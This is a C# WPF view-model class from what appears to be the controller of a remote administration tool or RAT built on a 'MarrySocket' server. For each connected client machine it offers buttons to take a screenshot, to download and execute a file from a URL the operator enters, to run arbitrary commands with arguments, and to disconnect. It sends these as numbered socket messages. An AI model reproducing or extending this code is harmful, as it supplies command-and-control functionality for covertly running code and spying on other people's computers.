namespace GuiServer.ServerImplementation.ViewModel
{
    using MarrySocket.MServer;
    using NetworkObjects;
    using System;
    using System.ComponentModel;
    using System.Windows;
    using Microsoft.VisualBasic;

    using System.Windows.Input;
    using GuiServer.ViewImplementation.Windows;

    public class ClientViewModel : INotifyPropertyChanged
    {
        public event PropertyChangedEventHandler PropertyChanged;

        private int id;
        private ClientSocket clientSocket;
        private ComputerInfo computerInfo;

        public ClientViewModel(ClientSocket clientSocket)
        {
            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot());
            this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload());
            this.CmdRun = new CommandHandler(() => this.Run(), this.CanRun());


            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect());
            this.clientSocket = clientSocket;
            this.Id = clientSocket.Id;
        }
 
        private bool CanScreenshot()
        {
            return true;
        }
        private bool CanDownload()
        {
            return true;

        }

        private bool CanRun()
        {
            return true;

        }

        private void Screenshot()
        {
            this.clientSocket.SendObject(1001, 40L);
        }
        private void DownloadExecute()
        {
            string url = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
            if (!string.IsNullOrEmpty(url))
            {
                DownloadExec downloadExec = new DownloadExec(url);
                this.clientSocket.SendObject(1002, downloadExec);
            }
        }

        private void Run()
        {
            String rcmd = TextInputWindow.ShowWindow("Run Command", "Command:");
                        string args = TextInputWindow.ShowWindow("Run Command", "Arguments:");
                        string sendstring = rcmd + "|" + args;

         if (!string.IsNullOrEmpty(rcmd))
            {
                this.clientSocket.SendObject(1003, sendstring);
          
            
            }
        }

        public ICommand CmdScreenshot { get; set; }
        public ICommand CmdDownloadExecute { get; set; }
        public ICommand CmdRun { get; set; }



        public ICommand CmdDisconnect { get; set; }
        public int Id { get { return this.id; } set { this.id = value; NotifyPropertyChanged("Id"); } }
        public ComputerInfo ComputerInfo { get { return this.computerInfo; } set { this.computerInfo = value; NotifyPropertyChanged("ComputerInfo"); } }
        public string Ip { get { return this.clientSocket.Ip; } }


        private void Disconnect()
        {
            this.clientSocket.Close();
        }

        private bool CanDisconnect()
        {
            return true;
        }

        private void NotifyPropertyChanged(string Obj)
        {
            if (PropertyChanged != null)
            {
                this.PropertyChanged(this, new PropertyChangedEventArgs(Obj));
            }
        }

    }
}
